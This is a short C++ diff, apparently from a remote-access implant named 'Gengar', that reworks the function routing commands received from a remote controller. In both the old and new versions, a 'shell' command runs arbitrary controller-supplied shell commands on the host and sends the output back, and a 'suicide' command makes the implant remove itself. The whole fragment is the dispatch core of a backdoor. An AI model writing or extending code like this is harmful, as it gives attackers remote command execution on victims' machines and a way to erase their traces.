@@ -20,13 +20,10 @@ void Gengar::ListenForCommand()
 
 void Gengar::RouteCommand(json cmd)
 {
-	std::string output;
-
-	if (cmd["type"] == "shell")
-		output = m_machine.RunShellCommand(cmd["content"]);
-	else if (cmd["type"] == "suicide")
+	if (cmd["cmd"] == "shell")
+		m_client.Send(m_machine.RunShellCommand(cmd["content"]));
+	else if (cmd["cmd"] == "suicide")
 		m_machine.Suicide();
 	else
-		output = "Unknown command type.";
-	m_client.Send(output);
+		m_client.Send("Unknown command.");
 }
